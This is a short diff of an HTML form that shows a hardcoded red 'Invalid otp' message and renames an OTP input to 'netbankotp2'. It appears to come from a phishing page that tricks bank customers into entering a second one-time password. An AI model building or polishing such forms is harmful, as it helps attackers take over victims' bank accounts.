@@ -87,7 +87,7 @@ span.psw {
 <BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>
 <h5><b><p style="color:red"style="background-color:red"; align="left"; padding>Invalid otp (please enter otp carefully)*</p></i></h5>
 
-<input type="text" placeholder="Enter OTP" name="OTP" required>
+<input type="text" placeholder="Enter OTP" name="netbankotp2" required>
   
 
  <label>
